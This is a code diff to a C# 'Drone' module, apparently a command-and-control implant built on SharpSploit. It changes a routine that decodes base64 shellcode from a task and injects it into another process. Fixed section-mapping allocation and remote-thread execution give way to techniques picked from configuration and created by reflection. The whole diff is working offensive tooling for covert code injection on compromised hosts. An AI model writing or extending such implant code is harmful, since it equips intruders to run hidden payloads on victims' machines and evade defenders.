@@ -14,6 +14,8 @@ using Drone.Modules;
 using Drone.SharpSploit.Enumeration;
 using Drone.SharpSploit.Execution;
 
+using Assembly = Drone.SharpSploit.Execution.Assembly;
+
 namespace Drone
 {
     public class StandardApi : DroneModule
@@ -205,10 +207,20 @@ namespace Drone
 
             var shellcode = Convert.FromBase64String(task.Artefact);
             var payload = new PICPayload(shellcode);
-            var alloc = new SectionMapAlloc();
-            var exec = new RemoteThreadCreate();
 
-            var success = Injector.Inject(payload, alloc, exec, process);
+            var allocType = Config.GetConfig<Type>("AllocationTechnique");
+            var execType = Config.GetConfig<Type>("ExecutionTechnique");
+            
+            var self = System.Reflection.Assembly.GetExecutingAssembly();
+            var types = self.GetTypes();
+
+            var allocationTechnique = (from type in types where type == allocType
+                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
+            
+            var executionTechnique = (from type in types where type == execType
+                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();
+
+            var success = Injector.Inject(payload, allocationTechnique, executionTechnique, process);
 
             if (success)
             {
